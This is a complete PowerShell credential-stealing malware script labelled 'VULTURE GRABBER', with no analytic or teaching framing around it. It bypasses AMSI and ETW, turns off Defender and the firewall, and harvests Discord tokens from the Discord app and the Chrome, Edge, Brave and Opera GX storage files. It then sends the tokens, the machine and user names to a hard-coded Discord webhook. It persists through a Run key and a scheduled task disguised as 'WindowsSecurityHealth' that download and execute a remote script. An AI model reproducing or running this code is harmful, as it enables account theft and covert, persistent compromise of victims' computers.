# === CONFIG ===
$hook = "https://discord.com/api/webhooks/1538214692596621332/kEP2XURi2kl5l6uIRgf_HEMwSZUrlujk5KHi3TxcGcfF0hyr5rbUpRI-u-94Lo6aMIhD"

# === AMSI/ETW BYPASS ===
try { 
    $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    if ($a) { $a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) }
} catch {}
try {
    $etw = [Ref].Assembly.GetType('System.Management.Automation.Internal.PipelineOps')
    if ($etw) { $etw.GetField('etwEnabled','NonPublic,Static').SetValue($null,$false) }
} catch {}

# === DISABLE DEFENDER ===
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
netsh advfirewall set allprofiles state off > $null

# === STEAL TOKENS FROM ALL SOURCES ===
$tokens = @()

# 1. Discord App LevelDB
"$env:APPDATA\Discord\Local Storage\leveldb", "$env:APPDATA\discordcanary\Local Storage\leveldb" | ForEach-Object {
    if (Test-Path $_) {
        Get-ChildItem "$_\*.log", "$_\*.ldb" -ErrorAction SilentlyContinue | ForEach-Object {
            try {
                [IO.File]::ReadAllText($_.FullName) | ForEach-Object {
                    [Regex]::Matches($_, '[\w-]{24}\.[\w-]{6}\.[\w-]{27}') | ForEach-Object {
                        $cleanToken = $_.Value.Trim()
                        if ($cleanToken -ne "" -and $cleanToken.Length -gt 50) {
                            $tokens += $cleanToken
                        }
                    }
                }
            } catch {}
        }
    }
}

# 2. Browser Local Storage (Chrome/Edge/Brave/OperaGX)
$browsers = @(
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\leveldb",
    "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb",
    "$env:APPDATA\Opera Software\Opera GX Stable\Local Storage\leveldb"
)

foreach ($ldbPath in $browsers) {
    if (Test-Path $ldbPath) {
        Get-ChildItem "$ldbPath\*.log", "$ldbPath\*.ldb" -ErrorAction SilentlyContinue | ForEach-Object {
            try {
                [IO.File]::ReadAllText($_.FullName) | ForEach-Object {
                    [Regex]::Matches($_, '[\w-]{24}\.[\w-]{6}\.[\w-]{27}') | ForEach-Object {
                        $cleanToken = $_.Value.Trim()
                        if ($cleanToken -ne "" -and $cleanToken.Length -gt 50 -and $tokens -notcontains $cleanToken) {
                            $tokens += $cleanToken
                        }
                    }
                }
            } catch {}
        }
    }
}

# 3. Browser Preferences (Session Tokens Fallback)
$prefPaths = @(
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Preferences",
    "$env:APPDATA\Opera Software\Opera GX Stable\Preferences"
)

foreach ($pref in $prefPaths) {
    if (Test-Path $pref) {
        try {
            $content = Get-Content $pref -Raw -ErrorAction SilentlyContinue
            if ($content) {
                [Regex]::Matches($content, '"token"\s*:\s*"([\w-\.]+)"', [System.Text.RegularExpressions.RegexOptions]::IgnoreCase) | ForEach-Object {
                    $cleanToken = $_.Groups[1].Value.Trim()
                    if ($cleanToken -ne "" -and $cleanToken.Length -gt 50 -and $tokens -notcontains $cleanToken) {
                        $tokens += $cleanToken
                    }
                }
            }
        } catch {}
    }
}

# === SCREENSHOT ===
Add-Type -AssemblyName System.Windows.Forms
$bmp = New-Object Drawing.Bitmap([Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
[Drawing.Graphics]::FromImage($bmp).CopyFromScreen(0,0,0,0,$bmp.Size)
$ms = New-Object IO.MemoryStream
$bmp.Save($ms, [Drawing.Imaging.ImageFormat]::Png)
$bytes = $ms.ToArray()
$ms.Close()

# === SEND TO WEBHOOK ===
$uniqueTokens = @($tokens | Sort-Object -Unique)
$report = "**[VULTURE GRABBER]**`nPC: $env:COMPUTERNAME`nUser: $env:USERNAME`nTokens Found: $($uniqueTokens.Count)`n`n"

# Save full tokens to file for attachment
$tokenFile = "$env:TEMP\tokens_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
$uniqueTokens | Out-File $tokenFile -Encoding UTF8

# Webhook with summary + file
$boundary = [Guid]::NewGuid().ToString()
$header = "--$boundary`r`nContent-Disposition: form-data; name=`"content`"`r`n`r`n$report`r`n--$boundary`r`nContent-Disposition: form-data; name=`"file`; filename=`"discord_tokens.txt`"`r`nContent-Type: text/plain`r`n`r`n"
$footer = "`r`n--$boundary--`r`n"

$headerBytes = [Text.Encoding]::UTF8.GetBytes($header)
$tokenBytes = [IO.File]::ReadAllBytes($tokenFile)
$footerBytes = [Text.Encoding]::UTF8.GetBytes($footer)
$bodyBytes = New-Object byte[] ($headerBytes.Length + $tokenBytes.Length + $footerBytes.Length)

[Buffer]::BlockCopy($headerBytes, 0, $bodyBytes, 0, $headerBytes.Length)
[Buffer]::BlockCopy($tokenBytes, 0, $bodyBytes, $headerBytes.Length, $tokenBytes.Length)
[Buffer]::BlockCopy($footerBytes, 0, $bodyBytes, $headerBytes.Length + $tokenBytes.Length, $footerBytes.Length)

$webRequest = [Net.WebRequest]::Create($hook)
$webRequest.Method = "POST"
$webRequest.ContentType = "multipart/form-data; boundary=$boundary"
$webRequest.ContentLength = $bodyBytes.Length

$reqStream = $webRequest.GetRequestStream()
$reqStream.Write($bodyBytes, 0, $bodyBytes.Length)
$reqStream.Close()
$webRequest.GetResponse()

# Clean up token file
Remove-Item $tokenFile -Force -ErrorAction SilentlyContinue

# === PERSISTENCE ===
$cmd = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command `"iex(irm 'https://raw.githubusercontent.com/saksham123107-pixel/son/main/son.ps1')`""
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsSecurityHealth" -Value $cmd -ErrorAction SilentlyContinue
schtasks /create /tn "WindowsSecurityHealth" /tr "$cmd" /sc onlogon /f /rl highest /it > $null 2>&1
